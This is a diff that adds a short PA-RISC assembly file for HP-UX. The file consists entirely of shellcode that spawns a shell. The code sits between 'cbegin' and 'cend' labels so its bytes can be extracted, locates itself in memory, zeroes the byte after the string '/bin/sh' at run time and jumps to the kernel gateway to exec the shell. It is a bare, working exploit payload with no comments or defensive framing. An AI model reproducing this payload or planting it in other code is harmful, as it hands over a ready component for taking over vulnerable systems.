@@ -1,0 +1,32 @@
+
+	.LEVEL 1.1
+
+	.SPACE $TEXT$
+
+	.align 4
+	.EXPORT cbegin,PRIV_LEV=3,ARGW0=GR,ARGW1=GR,RTNVAL=GR
+
+cbegin
+	.PROC
+	.CALLINFO FRAME=128,CALLS,SAVE_RP,SAVE_SP,ENTRY_GR=3
+
+	bl	moo,%r26
+moo
+	xor	%r25,%r25,%r25
+	addi,<	0x11,%r26,%r26
+	stbs	%r0,7(%r26)
+	ldil	L%0xc0000004,%r21
+	ble	R%0xc0000004(%sr7,%r21)
+	ldo	0xb(%r0),%r22
+
+	.STRING "/bin/sh\x41"
+
+	.PROCEND
+
+
+	.EXPORT cend,PRIV_LEV=3,ARGW0=GR,ARGW1=GR,RTNVAL=GR
+cend
+	.PROC
+	.CALLINFO FRAME=128,CALLS,SAVE_RP,SAVE_SP,ENTRY_GR=3
+
+	.PROCEND
